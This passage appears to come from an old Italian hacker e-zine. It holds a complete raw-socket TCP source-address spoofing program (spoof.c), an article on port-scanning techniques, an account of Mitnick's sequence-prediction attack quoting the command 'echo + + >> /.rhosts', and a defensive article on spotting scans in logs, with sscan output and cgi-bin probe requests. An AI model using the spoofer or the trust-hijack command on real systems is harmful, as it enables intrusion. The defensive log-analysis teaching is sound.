   printf("connesso!\n");
 else
  {
   perror("accettato");
   exit(1);
  }
 fflush(stdout);
 n=read(new,buffer,8);
 printf("leggo %i bytes dal socket\n",n);
 printf("il messaggio e': %s\n",buffer);
}

--------------------------------spoof.c---------------------------------
#include <stdio.h>
#include <netinet/ip.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/tcp.h>
#include <stdlib.h>
#include <errno.h>
#include <sys/types.h>
#include <asm/types.h>

#define FIN 1
#define SYN 2
#define SEQ 20985

/*---------------Calcolo del checksum--------------------------------*/
unsigned short in_cksum(unsigned short *addr,int len)
{
 register int nleft = len;
 register unsigned short *w = addr;
 register int sum = 0;
 unsigned short answer = 0;

 while (nleft > 1)
        {
        sum += *w++;
        nleft -= 2;
        }
 if (nleft == 1)
        {
        *(u_char *)(&answer) = *(u_char *)w ;
        sum += answer;
        }
 sum = (sum >> 16) + (sum & 0xffff);
 sum += (sum >> 16);
 answer = ~sum;
 return(answer);
}
/*----------------------------------------------------------------------*/

/*------------Manda il pacchetto TCP spoofato-------------------------------*/

int send_tcp(int sfd,unsigned int src,unsigned short src_p,
             unsigned int dst,unsigned short dst_p,tcp_seq seq,tcp_seq ack,
             u_char flags,char *buffer,int len)
             /*e non ditemi che i parametri sono troppi!*/
{
 struct iphdr ip_head;
 struct tcphdr tcp_head;
 struct sockaddr_in target;
 char packet[2048];     /*l'exploit di questo e' lasciato come esercizio*/
 int i;

 struct tcp_pseudo        /*la pseudo intestazione tcp*/
 {
  __u32 src_addr;
  __u32 dst_addr;
  __u8  dummy;
  __u8  proto;
  __u16 length;
 } pseudohead;

 struct help_checksum   /*struttura per il calcolo del checksum*/
 {
  struct tcp_pseudo pshd;
  struct tcphdr tcphd;
  char tcpdata[1024];
 } tcp_chk_construct;


 /*Prepare IP header*/
 ip_head.ihl      = 5;     /*lunghezza dell'intestazione senza opzioni*/
 ip_head.version  = 4;
 ip_head.tos      = 0;
 ip_head.tot_len  = htons(sizeof(struct iphdr)+sizeof(struct tcphdr)+len);
 ip_head.id       = htons(31337 + (rand()%100));
 ip_head.frag_off = 0;
 ip_head.ttl      = 255;
 ip_head.protocol = IPPROTO_TCP;
 ip_head.check    = 0;    /*Fill in later*/
 ip_head.saddr    = src;
 ip_head.daddr    = dst;
 ip_head.check    = in_cksum((unsigned short *)&ip_head,sizeof(struct iphdr));

 /*Prepare TCP header*/
 tcp_head.th_sport = htons(src_p);
 tcp_head.th_dport = htons(dst_p);
 tcp_head.th_seq   = htonl(seq);
 tcp_head.th_ack   = htonl(ack);
 tcp_head.th_x2    = 0;
 tcp_head.th_off   = 5;
 tcp_head.th_flags = flags;
 tcp_head.th_win   = htons(0x7c00);
 tcp_head.th_sum   = 0;  /*Si riempira' piu' tardi*/
 tcp_head.th_urp   = 0;

 /*Costruisco la struttura per il calcolo del checksum e lo calcolo*/
 pseudohead.src_addr=ip_head.saddr;
 pseudohead.dst_addr=ip_head.daddr;
 pseudohead.dummy=0;
 pseudohead.proto=ip_head.protocol;
 pseudohead.length=htons(sizeof(struct tcphdr)+len);

 tcp_chk_construct.pshd=pseudohead;
 tcp_chk_construct.tcphd=tcp_head;
 memcpy(tcp_chk_construct.tcpdata,buffer,len);

 tcp_head.th_sum=in_cksum((unsigned short *)&tcp_chk_construct,
                         sizeof(struct tcp_pseudo)+sizeof(struct tcphdr)+len);

 /*Assemblo il pacchetto*/
 memcpy(packet,(char *)&ip_head,sizeof(ip_head));
 memcpy(packet+sizeof(ip_head),(char *)&tcp_head,sizeof(tcp_head));
 memcpy(packet+sizeof(ip_head)+sizeof(tcp_head),buffer,len);

 /*Mando il pacchetto*/
 target.sin_family     = AF_INET;
 target.sin_addr.s_addr= ip_head.daddr;
 target.sin_port       = tcp_head.th_dport;
 i=sendto(sfd,packet,sizeof(struct iphdr)+sizeof(struct tcphdr)+len,0,
                    (struct sockaddr *)&target,sizeof(struct sockaddr_in));
 if(i<0)
   return(-1); /*Errore*/
 else
   return(i); /*Ritorna il numero dei bytes mandati*/
}
/*---------------------------------------------------------------------*/

main(int argc, char *argv[])
{
 int i;
 unsigned int source,target;
 unsigned short int s_port,d_port;
 char data[]="abcdefg";

 source=inet_addr(argv[1]);
 s_port=atoi(argv[2]);
 target=inet_addr(argv[3]);
 d_port=atoi(argv[4]);

 if((i=socket(AF_INET,SOCK_RAW,IPPROTO_RAW))<0) /*apro il socket per spedire*/
  {
   perror("socket");
   exit(1);
  }
 send_tcp(i,source,s_port,target,d_port,SEQ,0,SYN,NULL,0);
 printf("SYN spedito\n");
 usleep(1000);
 send_tcp(i,source,s_port,target,d_port,SEQ+1,0,0,data,8); /*nessun flag*/
 printf("dati spediti\n");
 usleep(1000);
 send_tcp(i,source,s_port,target,d_port,SEQ+9,0,FIN,NULL,0);
 printf("FIN spedito\n");
 close(i);
}

--

Questi due programmi sono dimostrativi e potete provarli anche in local,
l'importante e' che abbiate capito il concetto di questo bug.
Mi raccomando..........................................................spoof!

                                                                     T0rment0

[############################################################################]

              -------------------------------------
                    TECNICHE DI PORT SCANNING
              -------------------------------------
                                                     
Il PortScanning e' senza dubbio una delle tecniche di maggiore utilita' per
l'hacker al momento di raccogliere informazioni sul server da attaccare, e
per quei pochi principianti che non lo sapessero consiste nel trovare le
porte aperte di un server, il che e' come dire vedere quali servizi offre.
Tuttavia un portscanning puo' essere rilevato, quindi esistono delle tecniche
per renderlo meno visibile. In questo articolo cerchero' di spiegarle
prendendo in esame le tecniche principali di portscanning utilizzate dal
programma nmap (nessuna delle quali comunque riesce a fregare il mio
programma "Guardiano 1.0" :) 

-Scanning di Base TCP

Questo e' il tipo di portscanning piu' semplice, si usa semplicemente un
connect() (ogni utente puo' usarlo!) per ogni porta del server. Se la funzione
ritorna un errore allora si considera la porta chiusa, se si collega e'
aperta. Questo e' anche un tipo di scanning molto visibile


-SYN Scanning

Questo scanning e' meno visibile perche' non crea delle connesioni. Infatti
costruisce ed invia soltanto il primo pacchetto di un 3-way-handshake 
(si chiama SYN Scan perche' il primo pacchetto ha settata solo la flag SYN).
Se riceve un pacchetto di risposta con settate SYN e ACK (secondo passo
del 3-way-handshake) sa che la porta e' aperta. Se invece il pacchetto di
risposta ha settata la RST la porta e' chiusa.
Chi ha un minimo di pratica nella costruzione di pacchetti sotto linux
avra' gia' capito lo svantaggio di questa tecnica : per utilizzare i
SOCK_RAW (necessari a costruire il pacchetto con la flag SYN) bisogna
essere per forza root.

-FIN Scanning

Questa tecnica e' un ulteriore passo in avanti per quanto riguarda 
l'invisibilita' dello scanning e sfrutta un bug del protocollo TCP, 
cioe' quando arriva un pacchetto con flag FIN rivolto verso una porta
sulla quale non sta ascoltando nessun processo, il server risponde
con un pacchetto con flag RST, se invece la porta e' aperta non c'e'
nessuna risposta. 


-ICMP_PORT_UNREACH Scanning 

Questa tecnica e' volta a trovare porte UDP aperte, quindi non possiamo
utilizzare le tecniche precedenti, dato che nell'UDP non esiste
il 3-way-handshake ne' il pacchetto RST di risposta per le porte chiuse.
Tuttavia quando inviamo il nostro pacchetto ad un servizio UDP che su
quel server e' chiuso, il server ci rispondera' (si spera) con un 
pacchetto ICMP ICMP_PORT_UNREACH. Quindi ci bastera' considerare aperte
tutte quelle porte per le quali non riceveremo risposta.
Anche in questo caso bisogna essere root.

-write() Scanning

Se non avete il root ma volete cmq fare uno scanning di UDP, avete un'altra
possibilita'. Infatti anche se (dato che non siete root) non potete vedere
i pacchetti ICMP di risposta, potete scrivere alla porta UDP con un write()
come se la consideraste aperta, mentre se e' chiusa la funzione ritornera'
un errore. 

  
Ok, queste sono le tecniche principali per farvi un port scanner. O se 
anche volete continuare ad usare nmap almeno saprete cosa vogliono dire 
quei nomi...

		Techno Knight (techno83@freemail.it)

[############################################################################]

          ---------------------------------------------------------
                UNO DEI TANTI ATTACCHI USATI DA KEVIN MITNICK
          ---------------------------------------------------------

Leggendo gli attacchi messi a tiro da Kevin Mitnick, questo mi e' piaciuto
particolarmente anche perche' si tratta di 'primi spoofing messi a segno'
Si tratta di un attacco compiuto sui computer di Tsutomu Shimomura usando
una vulnerabilita' del TCP/IP.

Il 25 Dicembre 1994 fu trovato Tsutomu Shimomura, un fisico dei calcolatori
per il centro di computer di San Diego, sulla sua strada per la Sierra Nevadas
per andare a sciare. Egli ha lasciato la sua rete personale di computer in
esecuzione nel suo cottage sulle spiaggie di Del Mar, a nord di San Diego.
Probabilmente e' stato meglio cosi' per noi.

Solo dopo le due di pomeriggio, il sistema di Shimomura fu bloccato,
poi successivamente attaccato usando qualcosa di nuovo tra gli attacchi
internet, la ricerca del numero di sequenza (ISN). Shimomura lavora anche come
esperto di sicurezza, cosa che fa diventare i suoi sistemi oggetto di attacchi
da parte di hacker che vogliono superare il proprio limite, che ci permette
di capire in dettaglio cosa successe.
Siccome, come molti networks, Shimomura stava usando tcpdump per monitorare il
traffico entrante della sua connessione, successivamente spediva i suoi log
ad un posto prestabilito. La ricerca del numero di sequenza non e' una cosa
nuova. Steve Bellovin, un ricercatore ai laboratori Bell, e co-autore di
"Firewalls and Internet Security book" (Addison-Wesley, 1994,ISBN
0-201-63357-4), incluse dettagli di uno scenario di attacco simile nel suo
articolo del 1989 intitolato "Security Problems in the TCP/IP Protocol Suite".
Ma l'attacco Christmas Day e' il primo uso conosciuto della tecnica.

Per capire bene cosa successe, avremo bisogno di sapere come il protocollo
TCP (Transport Control Protocol) funzioni. Il TCP e' usato per stabilire 
delle connessioni bidirezionali e viene usato anche per trasferire una grande
quantita' di dati.

Il TCP provvede a creare connessioni attendibili. Cosi', senza molte delle
altre parti della suite Internet Protocol (come ICMP, Internet Control Message
Protocol, o UDP, User Datagram Protocol), il TCP stabilisce connessioni tra
il sito locale e quello remoto.
Finche' la connessione venga stabilita con successo, gruppi di byte di dati
sono riconosciuti spedendo il numero di sequenza al sito che spedisce.
Se il sito che spedisce non riceve subito un riconoscimento, i dati vengono
rispediti. Se il sito che spedisce, rispedisce gli stessi dati molte volte
senza successo, spedira' un errore all'applicazione dicendo che la connessione
e' stata rotta.

Il numero di sequenza e' usato per riconoscere i dati ricevuti. All'inizio
di una connessione TCP, il client manda un pacchetto TCP con un numero di
sequenza iniziale, senza riconoscere (cio' non puo' esserlo ancora). Se' c'e'
un'applicazione server in esecuzione sull'altra parte della connessione.
il server manda indietro il pacchetto TCP con il suo numero di sequenza
iniziale e un riconoscimento: il numero di sequenza iniziale del pacchetto del
client piu' uno. Quando il sistema del client riceve il pacchetto, deve
spedire indietro il suo riconoscimento: il numero di sequenza inziale del
server +1. Cosi', esso richiede tre pacchetti per stabilire una connessione
TCP.

C'e' di piu' del TCP, certamente. Non potete apprendere tutto il funzionamento
del TCP in questo piccolo articolo (provate Doug Comer's book Internetworking
with TCP/IP, Volume 1,Principles, Protocols, and Architecture. Second Edition
(Prentice Hall, 1991 ISBN 0-13-468505-9) o W. Richard Steven's TCP/IP
Illustrated, Volume 1 (Addison-Wesley, 1993, ISBN 0-201-63346-9).
Per ora, e' importante capire che i pacchetti TCP includono i bit di flag
che vengono settati per indicare delle condizioni.
Quando leggete l'account di Shimomura dell'attacco, fa riferimento a diversi
flag.

Il flag SYN (mostrato come ``S'' nell'output di tcpdump) indica l'inizio di
una connessione, ed e' incluso un numero di sequenza iniziale.
Quando il primo pacchetto e' spedito dal client, solo il flag SYN e' settato.
Quando il server risponde, sono settati sia il flag SYN che quello ACK,
indicando che e' incluso un valido riconoscimento.
Da qui, il flag ACK sara' settato, mostrando che ogni pacchetto include un
riconoscimento del pacchetto ricevuto.

Il flag PUSH (mostrato come ``P'') indica che i dati in questo pacchetto
dovranno essere indirizzati all'applicazione, piuttosto che metterli in fila.

Il flag RESET (``R'') dice al TCP di bloccare (resettare) la connessione,
ed e' spedito quando un client attende di connettersi ad un'applicazione
server che non e' in esecuzione. Nell'attacco, i RESETs vengono usati per
chiudere le connessioni meta' aperte usate per mantenere il server occupato.

Il flag FIN (``F'') viene usato per chiudere connessioni. Alla fine di ogni
connessione si manda un pacchetto con il flag FIN, che dev'essere riconosciuto.
Cosi' quattro pacchetti sono usati per chiudere una connesione TCP.
Di certo nell'attacco non vedrete due pacchetti FIN, perche' l'attaccante
non vede mai le risposte del sistema target, il terminale X.

Dopo questa spiegazione, siete pronti a leggere la descrizione di Shimomura,
se non lo eravate prima. Essenzialmente, l'attacco inizia con vari scan
lanciati dall'host toad.com (un sito registrato dalla Nebula Consulting).
Non lo sappiamo per certo, ma il server toad.com e' stato bucato prima usando
altre tecniche.

Gli scan, usando finger, showmount, e rpcinfo (simili agli scan del SATAN,
ma non automatici) hanno apparentemente aiutato l'attaccante a determinare
una relazione tra il terminale X di Shimomura (attualmente viene usato un
altro server come terminale X), e il server locale. Questa e' stata la vera
vulnerabilita' exploitata nell'attacco. I sistemi di Shimomura hanno avuto
fiducia di un altro, quindi usando comandi da remoto come rsh e rcp e' stato
possibile exploitarlo.
Conveniente e salvo, dietro uno strano perimetro di difesa, la fiducia e'
stata usata per irrompere in sistemi per molti anni. Il worm November 1988 si
basava appunto sulla fiducia e sui legami che avevano i sistemi, nei suoi
attacchi automatici.

Nella seconda fase dell'attacco, sono stati spediti 30 pacchetti TCP SYN alla
porta rlogin del server di Shimomura. Questi pacchetti provengono da un
indirizzo insolito, e il loro numero di sequenza iniziale viene incrementato
di uno invece dei piu' comuni 128,000. I propositi di questi pacchetti sono
di mettersi in fila sul server con connessioni aperte a meta', cosi' quando
lo spoofing inzia, il server non sapra' rispondere ai pacchetti spediti dal
terminale X come riconoscimento.

Poi, un sistema dell'universita' Loyola di Chicago (apollo.it.luc.edu) e'
stato usato per scannerizzare il terminale X. Poi di nuovo, una piccola serie
di pacchetti TCP (numero di sequenza iniziale incrementato di uno) vengono
spediti, ma questa volta le risposte vengono spedite al sito reale.
Ogni risposta contiene il numero iniziale di sequenza del terminale X.
Nell'articolo di Shimomura il tcpdump indicizza le risposte con il terminale X.

shell > apollo.it.luc.edu.1000 S, indica un pacchetto con il flag SYN settato.
Se sottraiamo il primo numero iniziale di sequenza dal secondo,
2021952000-2021824000, otteniamo 128,000. Cosi' l'attaccante conosce
che il prossimo numero di sequenza sara' incrementato di 128,000 rispetto
al precedente.

La scena ora e' ambientata nell'abuso delle relazioni tra il terminale X e
il server. L'attaccante genera pacchetti che sembrano provenire dal server, 
per aprire una connessione TCP con il demone rsh del terminale X.
Il terminale X manda un riconoscimento al server, ma queto riconoscimento
viene posto in coda. In seguito, l'attaccante genera il riconoscimento
dicendo che e' stato spedito dal server (se era cosi' veramente il server
iniziava una connessione normale). Ora c'e' una connessione TCP aperta dal
terminale X al server, che e' stata spoofata dal server.

Siccome il terminale X ha relazione col server, l'attaccante, mascherandosi
come root, manda il comando "echo + + >> /.rhosts" al terminale X, estendendo
la relazione con ogni server e utente che ha accesso a quel sistema.
Poi l'attaccante chiude la connessione spedendo un pacchetto settato FIN,
e il riconoscimento il pacchetto FIN non viene visto dal terminale X.
Alla fine, vari pacchetti RESET sono spediti al server per togliere tutti i
processi in coda. A questo punto, il server vorrebbe spedire un pacchetto
RESET al terminale X per chiudere la connessione spoofata con rsh ma e' troppo
tardi. L'attaccante ora puo' loggarsi come root sul terminale X usando rlogin.

Se volete approfondire l'argomento c'e' anche un avviso del CERT che parla
di questo attacco. Interessante vero? Attacchi simili si possono fare 
tutt'oggi, infatti alcuni articoli in questa ezine parlano proprio 
della predizione dell'ISN. Non vi resta che leggerveli se non l'avete gia'
fatto!

                                                                   T0rment0

[############################################################################]

                    ---------------------------------
                          CONOSCI IL TUO NEMICO
                    ---------------------------------
                  
Per la realizzazione di questo articolo mi sono ispirato ad un testo di
Lance Spitzner in cui egli vuole dare un aiuto a chiunque possega un sistema
Unix collegato in rete. E' un testo indirizzato principalmente al SysAdmin,
dando consigli su come tracciare i movimenti di chi vuole penetrare nel suo
sistema. L'utilita' di tutto cio' e' quindi sia a vantaggio del sysadmin che
dell'"hacker" che sapra' qualcosa in piu' su come muoversi tra i log di
sistema.

...Come in campo militare, vuoi tracciare le mosse dei "bravi ragazzi" e
sapere cosa stiano facendo al tuo sistema. In questo testo affronteremo cosa
puoi , o non puoi, determinare con i tuoi log di sistema. Dopo dovresti essere
in grado di capire se sei stato oggetto di attacchi,il perche',quali strumenti
sono stati usati, e se hanno funzionato.
Gli esempi fatti qui sono focalizzati su Linux, ma li puoi applicare quasi su
ogni tipo di sistema Unix. Tieni bene a mente che non c'e' un modo sicuro di
tracciare ogni passo del tuo nemico. Comunque sia quest'articolo e' un buon
inizio.

1.Rendere sicuri i tuoi Log.

Quest'articolo non e' sulla ricerca di intrusioni, ci sono una varieta'
eccellente di fonti che trattano di IDS. Se sei interessato alla ricerca delle
intrusioni ,posso suggerirti di dare un'occhiata a  www.nfr.net o
www.enteract.com/~lspitz/swatch.html . Quest'articolo e' centrato su
"intelligence gathering" (dovrebbe suonare come "deduzione intelligente" o
cose del genere, comunque sta a significare il capire cosa e' successo al
sistema deducendolo dai log nd\think\). Nello specifico, come capire cosa
sta facendo il tuo nemico monitorando i tuoi log di sistema.
Resterai sorpreso di quante informazioni puoi trovare nei tuoi stessi file di
log. Comunque ,prima di parlare dei tuoi log e di come vanno letti, dobbiamo
parlare di come rendere sicuri questi files.
I tuoi file di log non hanno nessun valore se non puoi valutarne l'integrita'.
La prima cosa che la maggior parte dei "bravi ragazzi" fa e' alterare i file
di log sul computer oggetto dei loro attacchi. C'e' una vasta varieta' di
rootkit che cancellano la loro presenza dai file di log (come cloack) o
alterano lo stesso logging (con demoni opportunamente "ritrattati").
Cosi' la prima cosa da fare e' rendere sicuri i tuoi log.

Questo significa che dovrai usare un server remoto di log. Indipendentemente
da quanto sia sicuro il tuo sistema, non puoi dare fiducia ai log su un
sistema ormai compromesso. Nella peggiore delle ipotesi il "bravo ragazzo"
puo' semplicemente fare un rm -rf /* sul tuo sistema rendendo il tuo hard
disk bello pulito. Questo renderebbe un tantino difficoltoso recuperare i
tuoi log. Per proteggerti da questo, dovrai fare in modo che il tuo sistema
crei dei log sia in locale che in remoto, su di un altro sistema. Suggerisco
di rendere il server remoto come un qualcosa di specifico, che ad esempio
tenga solamente dei log da piu' sistemi, e null'altro. Se il denaro e' un
problema puoi facilmente creare una piattaforma Linux che ti faccia da "log
server". Questo server dovrebbe essere altamente sicuro con tutti gli altri
servizi non disponibili, permettendo il solo accesso da console (vedi
Armoring Linux - http://www.enteract.com/~lspitz/linux.html per un esempio)

Inoltre assicurati che la porta 514 UDP sia bloccata magari tramite firewall
durante la tua connessione ad Internet. Questo protegge il tuo server di log
dal ricevere informazioni di log non autorizzate da Internet.
Per quelli di voi che amano queste cose paranoiche...una cosa che mi piace
fare e' ricompilare il syslogd per leggere file diversi di configurazione
come /var/tmp/.conf . Si puo' fare semplicemente cambiando /etc/syslog.conf
nel codice sorgente di qualsivoglia file. Configuriamo quindi il nostro file
per creare i log sia in locale che sul server remoto (esempio su
http://www.enteract.com/~lspitz/syslog.txt) . Mantieni pero' una copia del
file di configurazione standard /etc/syslog.conf, che indichera' a tutti i
log locali. Sebbene questo file sembri inutile distogliera' l'attenzione del
"BRAVO RAGAZZO" dal capire quale e' la vera destinazione dei log, cioe' al
server remoto. Un'altra chance per i vostri sistemi e' acquisire un metodo
sicuro di logging. Un altro metodo e' cambiare il tuo file syslogd con
qualcosa che abbia un auto-controllo di integrita', una sorta di euristica.
Si chiama syslog-ng che puoi trovare presso
http://www.balabit.hu/products/syslog-ng.html
La maggior parte dei log che useremo, che consulteremo saranno quelli del
server remoto. Come detto prima , possiamo essere relativamente tranquilli
di questi log poiche' sono conservati su un computer diverso ed "isolato".
Inoltre se piu' sistemi usano questo server log sara' piu' facile consultare
i log di tutti i sistemi in una volta. L'unica volta che guarderemo i file di
log locali sara' per confrontarli con quelli che ha il server remoto e capire
se sono stati alterati.

2.Pattern Matching (riconoscere gli schemi degli attacchi)              

Guardando i tuoi log puoi facilmente capire se hai subito un portscan. La
maggior parte dei "bravi ragazzi" scannerizzano un intera network per trovare
una singola vulnerabilita'. Se i tuoi log mostrano che i tuoi sistemi sono
stati connessi ad uno stesso sistema ,sulla stessa porta, e' quasi certamente
uno scan in cerca di exploit. Praticamente il nemico ha un exploit per una
singola vulnerabilita' del sistema e scannerizza per trovarla.
Quando la trova , la exploita. La maggior parte dei sistemi Linux hanno di
default i TCP Wrappers. Cosi' troveremo la maggior parte di queste connessioni
in /var/log/secure. Per altre varianti di Unix possiamo loggare tutte le
connessioni inetd lanciando inetd col flag -t . Un tipico scan in cerca di
exploit sembrera' piu' o meno come quello riportato qui sotto. Qui abbiamo
uno scan in cerca di una vulnerabilita' per il wu-ftpd.

/var/log/secure 
Apr 10 13:43:48 mozart in.ftpd[6613]: connect from 192.168.11.200 
Apr 10 13:43:51 bach in.ftpd[6613]: connect from 192.168.11.200 
Apr 10 13:43:54 hadyen in.ftpd[6613]: connect from 192.168.11.200 
Apr 10 13:43:57 vivaldi in.ftpd[6613]: connect from 192.168.11.200 
Apr 10 13:43:58 brahms in.ftpd[6613]: connect from 192.168.11.200       

Qui vediamo che 192.168.11.200 sta scannerizzando la nostra network. Nota come
l'host scannerizza sequenzialmente ogni ip (ma non e' sempre il caso). Questo
e' il vantaggio di avere un server log , puoi confrontare tutti i log dei tuoi
sistemi tutti in una volta ed avere un quadro piu' preciso della situazione.
Le ripetute connessioni alla porta 21 indicano che stanno cercando un exploit
per il demone wu-ftpd.
Abbiamo capito cosa sta cercando di fare il "bravo ragazzo". Spesso , gli scan
avvengono in fasi, voglio dire: qualcuno rilascia il codice sorgente di un
exploit per imap...vedrai una caterva di scan per imap nei tuoi log. Poi sara'
il tempo degli wu-ftpd e cosi' via... Una fonte eccellente di exploit e'
http://www.cert.org/advisories/ . A volte degli strumenti faranno scan per
una ricca varieta' di exploit allo stesso tempo, cosi' vedrai nei log un
singolo host connettersi a piu' porte.

Tieni a mente che se non stai loggando i tuoi servizi, non saprai mai se sei
stato scannerizzato per ognuno di questi. Ad esempio le connessioni rpc non
sono loggate. Comunque molti servizi possono essere semplicemente aggiunti ad
/etc/inetd.conf per log con TCP Wrappers. Ad esempio puoi aggiungere in
/etc/inetd.conf per Netbus. Puoi definire i Wrappers TCP in modo che vietino
e logghino queste connessioni.


3.Con che cosa mi studiano?                                             

A volte puoi determinare che programma, che strumento, e' stato usato per
scannerizzare la tua network. Alcuni degli strumenti di base scannerizzano
per un exploit specifico, come il ftp-scan.c . Se solo una singola porta e'
vittima di attacchi i "bravi ragazzi" stanno sicuramente usando uno di questi
strumenti a "missione sngola". Comunque esistono strumenti che scannerizzano
per una serie di piu' vulnerabilita' assieme. I piu' famosi sono sscan di
jsbach e nmap di Fyodor. Ho scelto questi 2 programi perche' rappresentano
il "top" degli strumenti per scannerizzare. Raccomando sinceramente di usare
questi 2 programmi sulla vostra network, resterete sorpresi di quelli che
potrebbero essere i risultati :)

* sscan rappresenta il "factotum" dei programmi di scan, ed e' probabilmente
il migliore in circolazione. Velocemente sonda una network per una larga
varieta' di vulnerabilita' (includendo cgi-bin). E' facilmente configurabile,
e permette di aggiungere "esplorazioni" per nuovi exploit. Devi solo dare al
programma una network ed una maschera della network, e lui fa tutto il resto.
Comunque colui che lo usa deve essere root per eseguirlo. L'output del
programma e' facile da capire (questo ha collaborato alla sua popolarita'):
Ti da un coinciso riepilogo di tutte le vulnerabilita' trovate. Tutto quello
che devi fare e' far partire sscan contro una network, aspettare per la parola
"vuln" nell'output e poi usare "l'exploit del giorno". Sotto c'e' un esempio
di scan con sscan contro il sistema "mozart"(172.17.6.30 )

          otto #./sscan -o 172.17.6.30 
--------------------------<[ * report for host mozart * 
<[ tcp port: 80 (http) ]       <[ tcp port: 23 (telnet) ] 
<[ tcp port: 143 (imap) ]      <[ tcp port: 110 (pop-3) ] 
<[ tcp port: 111 (sunrpc) ]    <[ tcp port: 79 (finger) ] 
<[ tcp port: 53 (domain) ]     <[ tcp port: 25 (smtp) ] 
<[ tcp port: 21 (ftp) ] 
--<[ *OS*: mozart: os detected: redhat linux 5.1 
mozart: VULN: linux box vulnerable to named overflow. 
-<[ *CGI*: 172.17.6.30: tried to redirect a /cgi-bin/phf request. 
-<[ *FINGER*: mozart: root: account exists. 
--<[ *VULN*: mozart: sendmail will 'expn' accounts for us 
--<[ *VULN*: mozart: linux bind/iquery remote buffer overflow 
--<[ *VULN*: mozart: linux mountd remote buffer overflow 
---------------------------<[ * scan of mozart completed *

*Nmap rappresenta il set del dato grezzo, del "raw data", cioe' non ti dice
quali vulnerabilita' esistono, ma ti dice quali porte sono aperte , poi sta a
te determinare com'e' la situazione. Nmap e' diventato il portscan per
eccellenza e per buone ragioni. E' un insieme si tutti i migliori portscan
ed include quindi il riconoscimento dell'OS, opzioni varie per l'assemblamento
dei pacchetti, scanning delle porte TCP ed UDP ecc ecc...
Hai comunque bisogno di una certa abilita' per usare questo programma ed
interpretare il suo output. Sotto c'e' un esempio di namp usato sempre contro
lo stesso sistema:

otto #nmap -sS -O 172.17.6.30 
Starting nmap V. 2.08 by Fyodor (fyodor@dhp.com, www.insecure.org/nmap/) 
Interesting ports on mozart (172.17.6.30): 
Port    State       Protocol  Service 
21      open        tcp        ftp 
23      open        tcp        telnet 
25      open        tcp        smtp 
37      open        tcp        time 
53      open        tcp        domain 
70      open        tcp        gopher 
79      open        tcp        finger 
80      open        tcp        http 
109     open        tcp        pop-2 
110     open        tcp        pop-3 
111     open        tcp        sunrpc 
143     open        tcp        imap2 
513     open        tcp        login 
514     open        tcp        shell 
635     open        tcp        unknown 
2049    open        tcp        nfs 

TCP Sequence Prediction: Class=truly random 
                         Difficulty=9999999 (Good luck!) 

Remote operating system guess: Linux 2.0.35-36 

Nmap run completed -- 1 IP address (1 host up) scanned in 2 seconds

Leggendo i tuoi log puoi determinare quali di questi programmi e' stato usato
contro di te. Per fare questo devi capire come funzionano questi strumenti.
Primo: sscan si mostrera' cosi':

/var/log/secure 
Apr 14 19:18:56 mozart in.telnetd[11634]: connect from 192.168.11.200 
Apr 14 19:18:56 mozart imapd[11635]: connect from 192.168.11.200 
Apr 14 19:18:56 mozart in.fingerd[11637]: connect from 192.168.11.200 
Apr 14 19:18:56 mozart ipop3d[11638]: connect from 192.168.11.200 
Apr 14 19:18:56 mozart in.telnetd[11639]: connect from 192.168.11.200 
Apr 14 19:18:56 mozart in.ftpd[11640]: connect from 192.168.11.200 
Apr 14 19:19:03 mozart ipop3d[11642]: connect from 192.168.11.200 
Apr 14 19:19:03 mozart imapd[11643]: connect from 192.168.11.200 
Apr 14 19:19:04 mozart in.fingerd[11646]: connect from 192.168.11.200 
Apr 14 19:19:05 mozart in.fingerd[11648]: connect from 192.168.11.200 

/var/log/maillog 
Apr 14 21:01:58 mozart imapd[11667]: command stream end of file, while reading
line user=??? host=[192.168.11.200]
Apr 14 21:01:58 mozart ipop3d[11668]: No such file or directory while reading
line user=??? host=[192.168.11.200]
Apr 14 21:02:05 mozart sendmail[11675]: NOQUEUE: [192.168.11.200]: expn root 

/var/log/messages 
Apr 14 21:03:09 mozart telnetd[11682]: ttloop:  peer died: Invalid or
incomplete multibyte or wide character
Apr 14 21:03:12 mozart ftpd[11688]: FTP session closed 

Sscan fa scanning anche per vulnerabilita' del cgi-bin , questo scan non sara'
loggato dal syslogd , lo troverai in access_log

/var/log/httpd/access_log 

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/phf
HTTP/1.0" 302 192

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/Count.cgi
HTTP/1.0" 404 170

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/test-cgi
HTTP/1.0" 404 169

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/php.cgi
HTTP/1.0" 404 168

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/handler
HTTP/1.0" 404 168

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/webgais
HTTP/1.0" 404 168

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/websendmail
HTTP/1.0" 404 172

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/webdist.cgi
HTTP/1.0" 404 172

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/faxsurvey
HTTP/1.0" 404 170

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/htmlscript
HTTP/1.0" 404 171

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/pfdisplay.cgi
HTTP/1.0" 404 174

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/perl.exe
HTTP/1.0" 404 169

192.168.11.200 - - [14/Apr/1999:16:44:49 -0500] "GET /cgi-bin/wwwboard.pl
HTTP/1.0" 404 172

192.168.11.200 - - [14/Apr/1999:16:44:50 -0500] "GET
/cgi-bin/ews/ews/architext_query.pl HTTP/1.0" 404 187

192.168.11.200 - - [14/Apr/1999:16:44:50 -0500] "GET /cgi-bin/jj HTTP/1.0"
404 163

Nota come e' stata fatta una connessione completa per tutte le porte (SYN, SYN-ACK, ACK)
e poi e' stata chiusa. Questo perche' sscan sta determinando a livello di applicazione 
cosa sta girando. Sscan non vuole sapere solo se la tua porta ftp e' aperta, ma pure che 
demone ftpd ci gira sopra. Lo stesso vale per imap,pop,etc. Questo si puo' vedere pure 
sniffando le tracce con sniffit, uno strumento utilizzato di solito per sniffare passwords.

mozart $ cat 172.17.6.30.21-192.168.11.200.7238 
220 mozart.example.net FTP server (Version wu-2.4.2-academ[BETA-17](1) Tue
